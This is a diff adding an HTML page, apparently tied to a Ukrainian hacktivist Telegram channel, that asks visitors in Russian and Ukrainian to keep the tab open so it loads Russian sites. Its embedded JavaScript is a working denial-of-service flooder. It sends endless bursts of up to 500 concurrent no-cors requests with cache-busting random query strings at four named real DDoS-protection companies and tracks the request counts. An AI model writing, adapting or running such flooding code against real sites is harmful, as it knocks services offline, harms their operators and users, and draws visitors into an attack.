@@ -1,0 +1,109 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <title>Russia and Belarus HTML DoS - DDOS protectors</title>
+
+</head>
+<body>
+<h1 class="title">Russia and Belarus HTML DoS</h1>
+<table>
+    <tr>
+        <td>
+        <h3>English version</h3>
+        <p class="sub">On Order - <a href="https://t.me/itarmyofukraine2022/96" targer="_blank">https://t.me/itarmyofukraine2022/96</a>
+       
+        </p>
+        
+    </td>
+    <td>
+        <h3 class="sub">Русская версия</h3>
+        <p class="sub">"Официальные" новости в рф - это театр абсурда и мы считаем, что это нужно остановить!</p>
+        <p class="sub">Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она
+            будет
+            автоматически
+            нагружать сайты российской пропаганды.</p>
+    </td>
+    <td>
+        <h3 class="sub">Українська версія</h3>
+        <p class="sub">Офіційні новини в рф - це театр абсурду і ми вважаємо, що це треба зупинити!</p>
+        <p class="sub">Будь ласка, просто залиште відкритою цю сторінку на своєму комп'ютері щоб вона автоматично
+            навантажувала
+            сайти
+            російської пропаганди.</p>
+    </td>
+
+    </tr>
+</table>
+
+   <div id="stats"></div>
+
+<div id="errors"></div>
+</body>
+<script>
+  var targets = {
+    'https://ddos-guard.net/ru': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://stormwall.pro/': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://qrator.net/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://solidwall.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+
+       }    
+  
+
+  var statsEl = document.getElementById('stats');
+  function printStats() {
+    statsEl.innerHTML = '<table border="1"><thead><tr><th>Web</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+  }
+  setInterval(printStats, 1000);
+
+  var CONCURRENCY_LIMIT = 500
+  var queue = []
+
+  async function fetchWithTimeout(resource, options) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), options.timeout);
+    return fetch(resource, {
+      method: 'GET',
+      mode: 'no-cors',
+      signal: controller.signal
+    }).then((response) => {
+  
+      clearTimeout(id);
+      
+      return response;
+    }).catch((error) => {
+        console.log(error.code);
+      clearTimeout(id);
+      throw error;
+    });
+  }
+
+  async function flood(target) {
+    for (var i = 0;; ++i) {
+      if (queue.length > CONCURRENCY_LIMIT) {
+        await queue.shift()
+      }
+      rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
+      queue.push(
+        fetchWithTimeout(target+rand, { timeout: 1000 })
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            targets[target].number_of_errored_responses++;
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              targets[target].number_of_errored_responses++;
+            }
+            targets[target].number_of_requests++;
+          })
+
+      )
+    }
+  }
+  
+  // Start
+  Object.keys(targets).map(flood)
+</script>
